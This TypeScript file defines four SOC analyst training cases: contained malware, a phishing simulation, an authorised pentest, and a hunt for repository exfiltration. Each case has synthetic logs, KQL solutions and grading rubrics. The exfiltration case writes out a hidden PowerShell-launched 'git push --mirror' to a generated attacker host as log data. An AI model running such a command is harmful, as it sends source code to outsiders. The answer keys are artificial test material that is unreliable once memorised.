// Cases that the v1 flat-answer model could not express: a true positive that
// is already contained (close, don't re-escalate), the company's own phishing
// simulation (benign but looks exactly like a campaign), an authorised
// penetration test (benign malicious-looking activity), and a hunt with no
// alert at all.
import type { CaseTemplate } from '../model.ts';
import type { RowRef } from '../../logs/corpus.ts';
import { DAY, HOUR, MIN, SEC } from '../../logs/time.ts';
import { BIN, binaryHash } from '../../synth/software.ts';
import { FICTITIOUS_ORGS } from '../../synth/orgs.ts';
import { userAgentOf } from '../../logs/noise/presence.ts';
import { domain, host, ip, kdt, rubric, technique, user } from './util.ts';

// ---------------------------------------------------------------------------
// True positive, but already auto-contained (TRUE POSITIVE → close/monitor)
// ---------------------------------------------------------------------------
const alreadyContained: CaseTemplate = {
  id: 'ops-already-contained',
  category: 'malware',
  difficulty: 'tier2',
  title: 'Malware detection on an endpoint',
  lesson: 'A true positive already contained by EDR',
  cysaDomains: ['1.0', '3.0'],
  kind: 'incident',
  when: 'business',
  build(ctx) {
    const { rng, log, pick, idx, at, world } = ctx;
    const victim = pick.person({ windows: true });
    const dev = idx.deviceOf(victim);
    const w = pick.where(victim, at);
    const hash = ctx.infra.hash('payload');
    const src = rng.pick(['a USB drive', 'a personal webmail attachment', 'a download']);
    const t0 = at - rng.int(8, 16) * MIN;
    const file = `invoice_scan_${rng.int(1000, 9999)}.exe`;
    const created = log.file({ TimeGenerated: t0, DeviceName: dev.name, ActionType: 'FileCreated', FileName: file, FolderPath: `C:\\Users\\${victim.sam}\\Downloads\\${file}`, FileSize: rng.int(200_000, 900_000), SHA256: hash, InitiatingProcessFileName: w.session?.browser === 'Chrome' ? 'chrome.exe' : 'msedge.exe', InitiatingProcessAccountName: victim.sam });
    // Defender blocked execution at t0+seconds.
    const blocked = log.alert({ TimeGenerated: t0 + 8 * SEC, AlertName: 'Malware blocked before execution', ProductName: 'Microsoft Defender for Endpoint', AlertSeverity: 'Medium', CompromisedEntity: dev.name, Entities: `${victim.upn}, ${file}, SHA256=${hash}`, Tactics: 'Execution', Status: 'Auto-remediated', Description: `Real-time protection quarantined ${file} on write; the file was not executed. Remediation completed.` });
    const quarantine = log.file({ TimeGenerated: t0 + 9 * SEC, DeviceName: dev.name, ActionType: 'FileDeleted', FileName: file, FolderPath: `C:\\Users\\${victim.sam}\\Downloads\\${file}`, FileSize: rng.int(200_000, 900_000), SHA256: hash, InitiatingProcessFileName: 'MsMpEng.exe', InitiatingProcessAccountName: 'SYSTEM' });

    return {
      alert: {
        rule: 'Malware blocked on endpoint',
        product: 'Microsoft Defender for Endpoint',
        severity: 'medium',
        time: at,
        summary: `${file} was quarantined on ${dev.name} (${victim.sam}). Status: auto-remediated.`,
        entities: [
          { kind: 'host', value: dev.name },
          { kind: 'user', value: victim.upn, label: victim.display },
          { kind: 'sha256', value: hash, label: file },
        ],
        fields: [['Action', 'Quarantined on write'], ['Status', 'Auto-remediated']],
      },
      briefing: `${world.org.name}: EDR is in block mode. A user brought in ${src}. This alert is one of dozens like it this week.`,
      truth: { disposition: 'true-positive', severity: 'low', action: 'close', techniques: ['T1204.002'], tactics: ['execution'], alsoAccept: ['T1105', 'T1566.001'] },
      evidence: [
        { id: 'blocked', label: `The file was quarantined on write and never executed`, why: 'A true positive — real malware — but the control worked. Detection is not the same as compromise.', rows: [blocked, quarantine] },
        { id: 'noexec', label: 'The file only ever landed in Downloads — no process ran that hash and nothing followed on the network', why: 'Confirms non-execution: nothing to contain, nothing beaconing.', rows: [created] },
      ],
      indicators: {
        block: [{ kind: 'sha256', value: hash, note: 'Still worth blocking fleet-wide and hunting for' }],
        scope: [],
        mustNot: [host(dev.name), user(victim)],
      },
      hints: [
        'The verdict is real malware — but did it run? The disposition and the action are not the same question. Check for any execution of that hash and any network that followed.',
        `DeviceProcessEvents | where SHA256 == "${hash}"`,
        `DeviceNetworkEvents | where DeviceName == "${dev.name}" and TimeGenerated > ${kdt(t0)}`,
      ],
      solution: [
        { title: 'What did EDR do?', kql: `SecurityAlert\n| where CompromisedEntity == "${dev.name}" and Entities has "${hash}"\n| project TimeGenerated, AlertName, AlertSeverity, Status, Description`, why: 'Quarantined on write, auto-remediated.' },
        { title: 'Did the file ever execute?', kql: `DeviceProcessEvents\n| where SHA256 == "${hash}"`, why: 'No rows — it never ran.', expectEmpty: true },
        { title: 'Did the file talk to anything?', kql: `DeviceNetworkEvents\n| where DeviceName == "${dev.name}" and InitiatingProcessFileName == "${file}"`, why: 'Nothing — no beacon, no second stage.', expectEmpty: true },
        { title: 'Where did it come from?', kql: `DeviceFileEvents\n| where SHA256 == "${hash}"\n| project TimeGenerated, DeviceName, ActionType, FolderPath, InitiatingProcessFileName`, why: 'Written by the browser to Downloads, then deleted by Defender seconds later.' },
      ],
      rubric: rubric([
        ['tp', 'This is a true positive — the file really is malware.', ['true positive', 'malware', 'real', 'malicious']],
        ['contained', 'EDR quarantined it on write; it never executed.', ['blocked', 'quarantine', 'not executed', 'contained', 'remediated']],
        ['action', 'Because it was already contained, the action is close (or monitor), not escalate.', ['close', 'monitor', 'no escalation', 'already', 'contained']],
        ['ioc', 'Still block the hash fleet-wide and hunt in case others received it and were not protected.', ['hash', 'block', 'hunt', 'fleet', 'ioc']],
      ]),
      explanation: [
        `This is a genuine true positive: ${file} is real malware, and marking it a false positive would be wrong. But disposition and action are different questions. EDR quarantined the file the moment it was written, before it could run — the process table shows no execution of that hash, and there is no follow-on network activity.`,
        `So there is nothing to contain on ${dev.name}: the control did its job. Re-escalating a cleanly auto-remediated block wastes IR's time and trains the queue to cry wolf. The right move is to close (or monitor briefly), while still treating the hash as an indicator.`,
        `Do the useful part: block ${hash} across the fleet and hunt for it in case anyone else received the same file on a host that was not protected, or before the signature existed. Note the delivery vector (${src}) for awareness. Then close.`,
      ],
      pitfalls: [
        'Reflexively escalating every malware alert. If EDR already contained it and nothing executed, escalation adds nothing.',
        "The opposite mistake is closing it as a false positive — it is a true positive that was blocked. The distinction matters for metrics and for hunting the hash.",
      ],
      references: [technique('T1204.002')],
    };
  },
};

// ---------------------------------------------------------------------------
// The company's own phishing simulation (BENIGN, looks like a campaign)
// ---------------------------------------------------------------------------
const phishingSimulation: CaseTemplate = {
  id: 'ops-phishing-simulation',
  category: 'phishing',
  difficulty: 'tier1',
  title: 'Many users clicked a new domain',
  lesson: 'The company\'s own phishing simulation',
  cysaDomains: ['1.0', '4.0'],
  kind: 'benign',
  when: 'business',
  build(ctx) {
    const { rng, log, pick, at, world } = ctx;
    const vendorOrg = rng.pick(FICTITIOUS_ORGS.filter((o) => o.domain !== world.org.domain));
    const vendor = `phish-sim.${vendorOrg.domain}`;
    const senderIp = ctx.infra.ip('sender');
    const subject = rng.pick(['Your package could not be delivered', 'Action required: password reset', 'You have a new voicemail']);
    const recipients = pick.people(rng.int(20, 40));
    const clickers = rng.sample(recipients, rng.int(3, 8));
    const t0 = at - rng.int(30, 90) * MIN;
    const id = `sim-${rng.hex(8)}`;
    const mails: RowRef[] = recipients.map((p, i) =>
      log.email({ TimeGenerated: t0 + i * rng.int(1, 8) * SEC, NetworkMessageId: id, SenderFromAddress: `no-reply@${vendor}`, SenderDisplayName: 'IT Service Desk', SenderMailFromDomain: vendor, SenderIPv4: senderIp, RecipientEmailAddress: p.upn, Subject: subject, EmailDirection: 'Inbound', DeliveryAction: 'Delivered', DeliveryLocation: 'Inbox', SPF: 'pass', DKIM: 'pass', DMARC: 'pass', BulkComplaintLevel: 0, Urls: `https://${vendor}/landing?e=${p.sam}`, AttachmentNames: '', ThreatTypes: '' }),
    );
    // Some clicked.
    const clicks: RowRef[] = clickers.map((p) => {
      const t = Math.min(t0 + rng.int(5, 40) * MIN, at - rng.int(1, 4) * MIN);
      const w = pick.where(p, t);
      return log.proxy({ TimeGenerated: t, SourceIP: w.lanIp, SourceUser: p.sam, Method: 'GET', Url: `https://${vendor}/landing?e=${p.sam}`, DestinationHost: vendor, DestinationIP: senderIp, DestinationPort: 443, StatusCode: 200, BytesSent: rng.int(400, 800), BytesReceived: rng.int(3000, 12000), Category: 'Newly Registered Domain', UserAgent: userAgentOf(p) });
    });
    // The tell: an IT ticket announcing the exercise, and the vendor domain
    // is on the tenant allow list.
    const ticket = log.ticket({ TicketId: log.nextTicketId('CHG'), Type: 'Change', Title: 'Quarterly phishing awareness simulation', Requester: 'Security — Awareness Team', AssignedTo: 'Security — Awareness Team', Status: 'Approved', Created: at - rng.int(4, 12) * DAY, WindowStart: t0 - HOUR, WindowEnd: t0 + 6 * HOUR, Scope: 'All staff', Details: `Simulated phishing run via ${vendor} (approved third-party platform). Landing page records clicks for training; no credentials are captured. Expect user reports and proxy hits.` });
    const intel = log.domainIntelRef(vendor);
    log.setDomainIntel(vendor, { ageDays: rng.int(400, 2000), category: 'Security Awareness Training', reputation: 'Good' });

    return {
      alert: {
        rule: 'Multiple users clicked a newly registered domain link',
        product: 'Microsoft Sentinel',
        severity: 'medium',
        time: at,
        summary: `${recipients.length} staff received "${subject}" from ${vendor}; ${clickers.length} clicked the link.`,
        entities: [
          { kind: 'domain', value: vendor },
          { kind: 'email', value: `no-reply@${vendor}` },
        ],
        fields: [['Recipients', String(recipients.length)], ['Clicks', String(clickers.length)]],
      },
      briefing: `${world.org.name} runs quarterly security-awareness activities. This looks like a broad credential-harvesting campaign.`,
      truth: { disposition: 'benign', severity: 'informational', action: 'close', techniques: [], tactics: [] },
      evidence: [
        { id: 'ticket', label: 'An approved change announces a phishing-awareness simulation via this exact platform, in this window', why: 'The activity is authorised internal training, not an attack.', rows: [ticket] },
        { id: 'vendor', label: `${vendor} is a known security-awareness training platform with good reputation`, why: 'The landing page trains users; it does not capture credentials.', rows: [intel] },
        { id: 'scope', label: 'The blast pattern and clicks match a simulation, and no credentials were POSTed anywhere', why: 'Clicks were recorded for training; there is no harvesting POST or follow-on account activity.', rows: [...mails.slice(0, 3), ...clicks] },
      ],
      indicators: { block: [], scope: [], mustNot: [domain(vendor, 'Approved awareness-training vendor')] },
      hints: [
        'A broad "campaign" that everyone got at once — is there an approved reason for it? Check change tickets and the domain’s reputation before you escalate.',
        'Tickets | where Type == "Change" and Details has "phishing"',
        `DomainIntel | where Domain == "${vendorOrg.domain}"`,
      ],
      solution: [
        { title: 'Is this authorised?', kql: 'Tickets\n| where Details has "phishing" or Title has "phishing"', why: 'An approved awareness simulation covering this window.' },
        { title: 'What is the domain?', kql: `DomainIntel\n| where Domain == "${vendorOrg.domain}"`, why: `${vendorOrg.name}'s established platform, good reputation.` },
        { title: 'Who clicked?', kql: `WebProxy\n| where DestinationHost == "${vendor}"\n| project TimeGenerated, SourceUser, Method, Url, StatusCode`, why: 'GETs to the landing page only — the click list for the awareness team.' },
        { title: 'Were credentials actually harvested?', kql: `WebProxy\n| where DestinationHost == "${vendor}" and Method == "POST"`, why: 'No POSTs — clicks were recorded, nothing was submitted.', expectEmpty: true },
        { title: 'Who received it?', kql: `EmailEvents\n| where SenderMailFromDomain == "${vendor}"\n| project TimeGenerated, RecipientEmailAddress, SenderDisplayName, DeliveryAction`, why: 'A broad send, as a simulation would be.' },
      ],
      rubric: rubric([
        ['authorised', 'An approved change shows this is the internal phishing-awareness simulation.', ['simulation', 'awareness', 'training', 'approved', 'authorised', 'ticket']],
        ['vendor', 'The domain is a known training platform, not attacker infrastructure.', ['training', 'vendor', 'platform', 'reputation', 'known']],
        ['nocreds', 'No credentials were POSTed — the landing page only records clicks.', ['no post', 'no credentials', 'clicks', 'recorded', 'landing']],
        ['close', 'Benign; close, and pass click data to the awareness team for follow-up training.', ['benign', 'close', 'awareness', 'training', 'report']],
      ]),
      explanation: [
        `The traffic looks exactly like a credential-harvesting campaign — a broad send, an urgent lure, a newly registered domain, and several clicks. That is by design: it is ${world.org.name}'s own quarterly phishing-awareness simulation, run through ${vendor}, the awareness platform operated by ${vendorOrg.name}. An approved change covers the window and the platform.`,
        `The differentiators from a real campaign: the vendor domain is established with good reputation and is on the tenant allow list, the landing page records clicks for training rather than capturing credentials, and there is no harvesting POST or follow-on account compromise.`,
        `Disposition benign. Close it, and hand the click list to the awareness team — the people who clicked are the Domain 4 follow-up (targeted training), not an incident. If these simulations generate a flood of SOC alerts each quarter, coordinate with the awareness team to pre-notify the SOC or suppress the vendor domain during the exercise window.`,
      ],
      pitfalls: [
        'Escalating the simulation as a real campaign — check for an authorised awareness exercise before mobilising IR.',
        'The opposite risk: assuming any lookalike blast is "probably the sim". Confirm the vendor domain and the change ticket; an attacker could hide behind that assumption.',
      ],
      references: [{ label: 'Attack simulation training', url: 'https://learn.microsoft.com/defender-office-365/attack-simulation-training-get-started' }],
    };
  },
};

// ---------------------------------------------------------------------------
// Authorised penetration test (BENIGN, malicious-looking)
// ---------------------------------------------------------------------------
const authorizedPentest: CaseTemplate = {
  id: 'ops-authorized-pentest',
  category: 'recon',
  difficulty: 'tier2',
  title: 'Coordinated recon and exploitation attempts',
  lesson: 'An authorised penetration test',
  cysaDomains: ['1.0', '2.0', '3.0'],
  kind: 'benign',
  when: 'business',
  build(ctx) {
    const { rng, log, at, world } = ctx;
    const testerIp = ctx.infra.ip('vps');
    const web = world.publicIps.web;
    const internalKali = `${world.sites[0].prefix}.20.${rng.int(200, 240)}`;
    const t0 = at - rng.int(40, 80) * MIN;
    // External web app probing.
    const probes: RowRef[] = [];
    for (let i = 0; i < 30; i++) {
      probes.push(log.fw({ TimeGenerated: t0 + i * rng.int(5, 40) * SEC, Direction: 'Inbound', Action: rng.bool(0.7) ? 'Allow' : 'Deny', Protocol: 'TCP', SourceIP: testerIp, SourcePort: rng.int(30000, 60000), DestinationIP: web, DestinationPort: rng.pick([443, 8080, 8443]), RuleName: 'allow-web-dmz', BytesSent: rng.int(400, 4000), BytesReceived: rng.int(500, 9000), SessionDurationSec: rng.int(0, 3) }));
    }
    // A test agent inside doing light scans.
    const scans: RowRef[] = [];
    for (let i = 0; i < 20; i++) {
      scans.push(log.fw({ TimeGenerated: t0 + rng.int(0, 40) * MIN, Direction: 'Internal', Action: rng.bool(0.5) ? 'Allow' : 'Deny', Protocol: 'TCP', SourceIP: internalKali, SourcePort: rng.int(40000, 60000), DestinationIP: `${world.sites[0].prefix}.10.${rng.int(2, 60)}`, DestinationPort: rng.pick([445, 3389, 22, 1433, 5985]), RuleName: 'east-west-default', BytesSent: rng.int(60, 400), BytesReceived: 0, SessionDurationSec: 0 }));
    }
    const firm = rng.pick(FICTITIOUS_ORGS.filter((o) => o.domain !== world.org.domain)).name;
    const roe = log.ticket({ TicketId: 'CHG-PT-0042', Type: 'Change', Title: 'Authorised external + internal penetration test', Requester: 'CISO Office', AssignedTo: 'Security', Status: 'Approved', Created: at - rng.int(10, 30) * DAY, WindowStart: t0 - HOUR, WindowEnd: t0 + 3 * DAY, Scope: `Public web (${web}); internal test agent (${internalKali}); source ${testerIp}`, Details: `Third-party red team (${firm}, offensive security practice). Rules of engagement approved by CISO. Test source IP ${testerIp}; internal Kali agent ${internalKali}. Do not disrupt; SOC informed. De-conflict via the security channel.` });

    return {
      alert: {
        rule: 'Web application attack and internal scanning from correlated sources',
        product: 'Microsoft Sentinel',
        severity: 'high',
        time: at,
        summary: `Sustained probing of the public web app from ${testerIp} and internal port scanning from ${internalKali}.`,
        entities: [
          { kind: 'ip', value: testerIp },
          { kind: 'ip', value: internalKali },
        ],
        fields: [['External source', testerIp], ['Internal source', internalKali]],
      },
      briefing: `${world.org.name}: attacks on the public web app plus internal scanning would normally be a serious, coordinated intrusion.`,
      truth: { disposition: 'benign', severity: 'informational', action: 'close', techniques: [], tactics: [] },
      evidence: [
        { id: 'roe', label: 'An approved penetration-test change names both source IPs, the scope and the window', why: 'The activity is a sanctioned red-team engagement, not an intrusion.', rows: [roe] },
        { id: 'external', label: `The external probing comes only from the named test source ${testerIp}`, why: 'Scoped exactly to the rules of engagement.', rows: probes.slice(0, 8) },
        { id: 'internal', label: `The internal scans come from the named test agent ${internalKali}`, why: 'Matches the ROE; no other hosts are involved.', rows: scans.slice(0, 8) },
      ],
      indicators: { block: [], scope: [], mustNot: [ip(testerIp, 'Authorised pentest source'), ip(internalKali, 'Authorised internal test agent')] },
      hints: [
        'Coordinated external + internal attack activity is serious — unless it is the pentest you were told about. Confirm the sources against the rules of engagement before acting.',
        'Tickets | where Type == "Change" and Title has "penetration"',
        `FirewallLogs | where SourceIP in ("${testerIp}", "${internalKali}") | summarize count() by SourceIP, Direction`,
      ],
      solution: [
        { title: 'Is there a pentest on?', kql: 'Tickets\n| where Title has "penetration" or Details has "red team"', why: 'Approved engagement; both IPs and the window named.' },
        { title: 'Do the sources match the ROE?', kql: `FirewallLogs\n| where SourceIP in ("${testerIp}", "${internalKali}")\n| summarize Events = count(), Targets = dcount(DestinationIP) by SourceIP, Direction`, why: 'Exactly the two named sources; nothing outside scope.' },
        { title: 'The external probing', kql: `FirewallLogs\n| where SourceIP == "${testerIp}"\n| project TimeGenerated, DestinationIP, DestinationPort, Action\n| take 20`, why: 'Web ports on the public site, from the named source.' },
        { title: 'The internal scanning', kql: `FirewallLogs\n| where SourceIP == "${internalKali}"\n| project TimeGenerated, DestinationIP, DestinationPort, Action\n| take 20`, why: 'Admin ports on internal servers, from the named test agent.' },
        { title: 'Anything from other sources?', kql: `FirewallLogs\n| where Direction == "Inbound" and DestinationIP == "${web}" and Action == "Allow" and SourceIP != "${testerIp}"\n| summarize count() by SourceIP\n| sort by count_`, why: 'Only the usual background — no piggybacking attacker.' },
      ],
      rubric: rubric([
        ['roe', 'An approved penetration-test change (rules of engagement) covers this activity.', ['pentest', 'penetration', 'red team', 'rules of engagement', 'roe', 'approved']],
        ['sources', 'The activity comes only from the named test sources, within scope and window.', ['source', 'scope', 'named', 'test ip', 'window']],
        ['deconflict', 'De-conflict with the security team rather than mobilising IR.', ['de-conflict', 'confirm', 'coordinate', 'security team']],
        ['close', 'Benign authorised testing — close, and stay alert for real activity hiding alongside it.', ['benign', 'close', 'monitor', 'alongside']],
      ]),
      explanation: [
        `External web-app attacks correlated with internal scanning is exactly what a serious intrusion looks like — which is why an attacker would love for you to wave it away, and why a real red team makes you practise the confirmation. Here an approved penetration-test change names both sources (${testerIp} externally, ${internalKali} internally), the scope and a multi-day window, run by a third-party red team under CISO-approved rules of engagement.`,
        `The activity stays inside those bounds: the external probing comes only from the test source, the internal scans only from the test agent, and nothing else is piggybacking on the public web app. De-conflict via the security channel confirms it.`,
        `Disposition benign. Close it as authorised testing — but keep watching: the one real risk during a pentest is a genuine attacker hiding in the noise, so a quick check that no other source is doing the same things is worth the minute.`,
      ],
      pitfalls: [
        'Treating a scoped, approved pentest as a live incident and mobilising IR against your own red team.',
        'The real danger is the reverse: assuming everything is "just the pentest". Always confirm the sources are the named ones and nothing else is riding along.',
      ],
      references: [{ label: 'Rules of engagement (pentest)', url: 'https://csrc.nist.gov/glossary/term/rules_of_engagement' }],
    };
  },
};

// ---------------------------------------------------------------------------
// Hunt: no alert, an anomaly to find (TRUE POSITIVE)
// ---------------------------------------------------------------------------
const huntNightExfil: CaseTemplate = {
  id: 'ops-hunt-repo-exfil',
  category: 'exfil',
  difficulty: 'tier3',
  title: 'Threat hunt: outbound data movement',
  lesson: 'Repository mirrored to an unknown host',
  cysaDomains: ['1.0', '3.0'],
  kind: 'incident',
  when: 'any',
  build(ctx) {
    const { rng, log, pick, idx, at, world } = ctx;
    const eng = ctx.foothold?.personId ? idx.person(ctx.foothold.personId) : pick.person({ dept: 'Engineering', windows: true });
    const dev = idx.deviceOf(eng);
    const w = pick.where(eng, at);
    // Attacker exfiltrates a large repo to a private code-hosting account.
    const c2 = ctx.infra.domain('exfil', { style: 'tech' });
    const c2ip = ctx.infra.ip('exfil');
    const gb = rng.int(8, 30) / 10;
    const t0 = at - rng.int(30, 90) * MIN;
    const uploads: RowRef[] = [];
    const chunks = rng.int(15, 30);
    for (let i = 0; i < chunks; i++) {
      uploads.push(log.proxy({ TimeGenerated: t0 + i * rng.int(30, 120) * SEC, SourceIP: w.lanIp, SourceUser: eng.sam, Method: 'POST', Url: `https://${c2}/git-receive-pack`, DestinationHost: c2, DestinationIP: c2ip, DestinationPort: 443, StatusCode: 200, BytesSent: Math.round((gb * 1e9) / chunks), BytesReceived: rng.int(200, 900), Category: 'Uncategorized', UserAgent: 'git/2.45.2', Action: 'Allowed' }));
    }
    log.dns({ TimeGenerated: t0 - 5 * SEC, ClientIP: w.lanIp, Computer: 'DC01', Name: c2 });
    const gitProc = log.proc({ TimeGenerated: t0 - 20 * SEC, DeviceName: dev.name, AccountName: eng.sam, FileName: 'git.exe', FolderPath: BIN.git.path, ProcessCommandLine: `git.exe push --mirror https://${c2}/mirror.git`, SHA256: binaryHash('git.exe'), Signer: BIN.git.signer, ProcessIntegrityLevel: 'Medium', InitiatingProcessFileName: 'powershell.exe', InitiatingProcessCommandLine: 'powershell.exe -nop -w hidden' });
    const netRows = uploads.slice(0, 10).map((_, i) => log.net({ TimeGenerated: t0 + i * 30 * SEC, DeviceName: dev.name, LocalIP: w.lanIp, RemoteIP: c2ip, RemotePort: 443, RemoteUrl: c2, InitiatingProcessFileName: 'git.exe', InitiatingProcessAccountName: eng.sam }));
    const intel = log.domainIntelRef(c2);

    return {
      alert: {
        rule: 'Threat hunt: source-code exfiltration',
        product: 'Threat hunt',
        severity: 'informational',
        time: at,
        summary: 'No alert fired. Hypothesis: an attacker (or insider) is exfiltrating source code to an unknown external host. Hunt the proxy and endpoint data for large outbound transfers to non-business destinations.',
        entities: [],
        fields: [['Type', 'Proactive hunt — no detection'], ['Hypothesis', 'Source-code exfiltration over git to a non-sanctioned host']],
      },
      briefing: `${world.org.name}: Engineering pushes to github.com and the internal ${world.org.tenant}.atlassian.net only. There is no alert here — you are hunting. Start broad (who is sending the most data, and where) and narrow to what does not belong.`,
      truth: { disposition: 'true-positive', severity: 'high', action: 'escalate', techniques: ['T1567.001', 'T1048'], tactics: ['exfiltration', 'command-and-control'], alsoAccept: ['T1071.001', 'T1059.001', 'T1041'] },
      evidence: [
        { id: 'volume', label: `${gb.toFixed(1)} GB pushed over git to ${c2}, a non-business destination`, why: 'The whole repository mirrored to a host that is not GitHub or the internal Atlassian.', rows: uploads },
        { id: 'process', label: `A hidden PowerShell launched "git push --mirror" to ${c2}`, why: 'Automated, hidden, mirroring everything — not a developer’s normal push.', rows: [gitProc, ...netRows] },
        { id: 'destination', label: `${c2} is an unknown, recently seen domain with no business relationship`, why: 'Not a sanctioned code host.', rows: [intel] },
      ],
      indicators: {
        block: [domain(c2, 'Exfil destination'), ip(c2ip)],
        scope: [user(eng), host(dev.name)],
        mustNot: [domain('github.com', 'Sanctioned code host'), domain(`${world.org.tenant}.atlassian.net`, 'Internal')],
      },
      hints: [
        'There is no alert to anchor on. Rank outbound data by volume and destination, then subtract the destinations you expect Engineering to use.',
        'WebProxy | where Method == "POST" | summarize Bytes = sum(BytesSent) by SourceUser, DestinationHost | sort by Bytes',
        'Once you have the destination and the user, find the process that sent it: DeviceProcessEvents | where FileName == "git.exe"',
      ],
      solution: [
        { title: 'Biggest outbound transfers', kql: 'WebProxy\n| where Method == "POST"\n| summarize Bytes = sum(BytesSent), Requests = count() by SourceUser, DestinationHost\n| sort by Bytes', why: `A gigabytes-scale push to ${c2} stands out — not github.com or the internal Atlassian.` },
        { title: 'The transfer itself', kql: `WebProxy\n| where DestinationHost == "${c2}"\n| project TimeGenerated, SourceUser, Method, Url, DestinationIP, BytesSent, UserAgent`, why: 'Git smart-HTTP pushes, chunk after chunk.' },
        { title: 'Is that a sanctioned host?', kql: `DomainIntel\n| where Domain == "${c2}"`, why: 'Unknown, recently seen, no business relationship.' },
        { title: 'What did the transfer?', kql: `DeviceProcessEvents\n| where FileName == "git.exe" and ProcessCommandLine has "${c2}"\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName`, why: 'A hidden PowerShell running git push --mirror — the whole repo.' },
        { title: 'Confirm on the endpoint', kql: `DeviceNetworkEvents\n| where DeviceName == "${dev.name}" and RemoteUrl == "${c2}"\n| summarize count() by InitiatingProcessFileName`, why: 'git.exe holding the connection.' },
      ],
      rubric: rubric([
        ['hunt', 'With no alert, rank outbound volume by user and destination and subtract expected hosts.', ['volume', 'baseline', 'outbound', 'rank', 'subtract', 'hunt']],
        ['destination', 'The destination is not a sanctioned code host (github / internal Atlassian).', ['not github', 'unsanctioned', 'unknown', 'destination', 'non-business']],
        ['mirror', 'git push --mirror from a hidden PowerShell exfiltrates the entire repository.', ['mirror', 'git', 'repository', 'hidden', 'powershell']],
        ['contain', 'Escalate: block the destination, isolate the host, and scope what was pushed.', ['block', 'isolate', 'escalate', 'scope', 'contain']],
      ]),
      explanation: [
        `Nothing alerted — this is a proactive hunt, and the skill is finding the anomaly without a detection pointing at it. Ranking outbound POST volume by user and destination surfaces a gigabytes-scale transfer to ${c2}, which is neither github.com nor the internal ${world.org.tenant}.atlassian.net that Engineering actually uses.`,
        `Pulling that thread on the endpoint shows the mechanism: a hidden PowerShell launched git push --mirror to ${c2}, which pushes every branch and tag — the whole repository — to an unknown host with no business relationship. That is source-code exfiltration.`,
        `Escalate: block ${c2}/${c2ip}, isolate ${dev.name}, and scope exactly what was pushed. Investigate whether ${eng.first}'s account was compromised or this is an insider, and rotate any secrets that live in the exfiltrated repositories.`,
      ],
      pitfalls: [
        'Hunting without a baseline: you have to know what Engineering normally talks to (github, internal Atlassian) to see what does not belong.',
        'Stopping at "a big upload" — the git --mirror detail is what makes it whole-repository exfiltration rather than a large but ordinary push.',
      ],
      references: [technique('T1567.001')],
    };
  },
};

export const opsTemplates: CaseTemplate[] = [alreadyContained, phishingSimulation, authorizedPentest, huntNightExfil];
